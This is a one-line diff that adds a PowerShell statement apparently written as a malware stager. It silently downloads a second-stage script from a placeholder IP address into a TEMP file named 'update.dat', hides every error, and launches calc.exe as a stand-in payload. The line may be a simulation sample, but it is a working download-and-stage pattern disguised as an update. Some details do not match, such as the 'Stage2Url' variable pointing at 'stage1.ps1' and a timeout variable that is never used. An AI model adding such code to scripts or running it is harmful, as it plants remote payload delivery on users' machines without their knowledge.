@@ -1,0 +1,1 @@
+$Stage2Url = 'https://192.0.2.145:443/stage1.ps1'; $WorkingPath = "$env:TEMP\update.dat"; $StageTimeout = 137; Invoke-WebRequest -Uri $Stage2Url -OutFile $WorkingPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
